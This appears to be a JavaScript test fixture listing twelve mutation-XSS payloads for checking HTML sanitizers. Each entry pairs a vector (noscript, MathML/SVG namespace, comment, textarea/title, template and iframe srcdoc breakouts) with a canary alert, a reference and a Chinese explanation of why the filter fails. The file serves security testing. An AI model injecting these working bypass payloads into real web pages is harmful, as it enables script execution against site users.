/** 突变型 XSS（mXSS）：浏览器解析器与净化后再解析语义不一致类 */
export default [
  {
    id: 'mxss-01',
    category: 'mxss',
    name: 'noscript 上下文突破',
    vector: '<noscript><p title="</noscript><img src=x onerror="alert(window.__canary)">">',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-01' },
    ref: 'https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inhead',
    description: 'noscript 在脚本启用/禁用两种解析模式下 tokenization 不同，属性中的 </noscript> 可突破回 HTML 上下文。'
  },
  {
    id: 'mxss-02',
    category: 'mxss',
    name: 'MathML 外内容 mglyph/style 变异',
    vector: '<math><mtext><table><mglyph><style><img src=x onerror="alert(window.__canary)"></style>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-02' },
    ref: 'CVE-2014-0458 类外内容命名空间变异',
    description: 'MathML/SVG 外内容进入 HTML 集成点时解析上下文切换，style 内文本会被重新按 HTML 解析。'
  },
  {
    id: 'mxss-03',
    category: 'mxss',
    name: 'SVG 内 CDATA 承载脚本',
    vector: '<svg><script><![CDATA[alert(window.__canary)]]></script></svg>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-03' },
    ref: 'SVG foreignObject/CDATA 解析差异',
    description: 'SVG script 内 CDATA 段在 HTML 解析器与 XML 序列化器间语义不同，历史上多次绕过字符串型过滤器。'
  },
  {
    id: 'mxss-04',
    category: 'mxss',
    name: 'SVG style 内 HTML 元素复活',
    vector: '<svg><style><img src=x onerror="alert(window.__canary)"></style></svg>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-04' },
    ref: 'CVE-2016-1632 类',
    description: '<style> 在 SVG 内外内容规则不同，内部内容可能被当作 HTML 元素处理。'
  },
  {
    id: 'mxss-05',
    category: 'mxss',
    name: '注释边界突破',
    vector: '<!--><img src=x onerror="alert(window.__canary)">',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-05' },
    ref: 'HTML 注释畸形闭合',
    description: '畸形注释（缺少 --> 或含 >）在不同解析器中注释边界判断不同。'
  },
  {
    id: 'mxss-06',
    category: 'mxss',
    name: 'textarea 内容突破',
    vector: '<textarea><img src=x onerror="alert(window.__canary)"></textarea>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-06' },
    ref: 'RCDATA 元素语义',
    description: 'textarea/title 是 RCDATA 元素，内部标签按文本处理；若净化后被放入普通 HTML 上下文则复活。'
  },
  {
    id: 'mxss-07',
    category: 'mxss',
    name: 'title RCDATA 突破',
    vector: '<title></title><img src=x onerror="alert(window.__canary)">',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-07' },
    ref: 'RCDATA 结束标签伪造',
    description: '伪造 title 闭合把后续内容切回 HTML 数据态。'
  },
  {
    id: 'mxss-08',
    category: 'mxss',
    name: 'table foster parenting 逃逸',
    vector: '<table><img src=x onerror="alert(window.__canary)"></table>',
    context: 'table',
    expectation: 'execute',
    detect: { canary: 'mxss-08' },
    ref: 'HTML 表格 foster parenting 算法',
    description: 'table 内非法位置的元素被 foster 到表格外，基于位置的过滤可能因此失效。'
  },
  {
    id: 'mxss-09',
    category: 'mxss',
    name: 'template 内容隐藏通道',
    vector: '<template><img src=x onerror="alert(window.__canary)"></template>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-09' },
    ref: 'HTMLTemplateElement content document fragment',
    description: 'template 内容存在独立 DocumentFragment 中，只遍历 element 子节点的净化器会漏检。'
  },
  {
    id: 'mxss-10',
    category: 'mxss',
    name: 'iframe srcdoc 嵌套执行',
    vector: '<iframe srcdoc="&lt;img src=x onerror=alert(window.__canary)&gt;"></iframe>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-10' },
    ref: 'iframe srcdoc 独立文档',
    description: 'srcdoc 是独立 HTML 文档，实体解码后在子帧执行；钩子必须覆盖嵌套 frame。'
  },
  {
    id: 'mxss-11',
    category: 'mxss',
    name: '二次解析变异（double render round-trip）',
    vector: '<noscript><p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(window.__canary)&gt;"></noscript>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-11' },
    ref: '实体编码 + 解析模式切换',
    description: '第一次解析落在属性文本里，序列化器若不统一转义，fresh DOMParser 二次解析时实体解码为真实标签。'
  },
  {
    id: 'mxss-12',
    category: 'mxss',
    name: 'math mtext 表格集成点',
    vector: '<math><mtext><table><tr><td><img src=x onerror="alert(window.__canary)"></td></tr></table></mtext></math>',
    context: 'body',
    expectation: 'execute',
    detect: { canary: 'mxss-12' },
    ref: 'MathML 集成点命名空间切换',
    description: 'table 是 MathML 内的 HTML 集成点，命名空间在集成点处切回 HTML，过滤器若只看标签名会误判。'
  }
];
